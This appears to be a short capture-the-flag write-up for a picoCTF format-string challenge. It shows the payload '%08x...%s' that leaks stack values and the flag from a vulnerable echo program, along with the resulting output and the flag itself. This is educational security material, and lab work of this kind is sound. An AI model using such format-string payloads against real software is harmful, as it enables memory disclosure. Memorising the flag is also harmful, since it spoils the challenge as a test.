## Solution

Opening the [C file](echo.c) shows that the program uses printf to print back the input. We see that the flag is also stored in the program, meaning that we can exploit printf to return the flag.

We can use `%08x` to fetch parameters from the stack. We want our flag to be returned as a string, so append `%s` to the end.

By giving `%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s` to the program, we output `00000040.f77595a0.08048647.f7790a74.00000001.f7768490.ffbae194.picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}`.

The flag is `picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}`
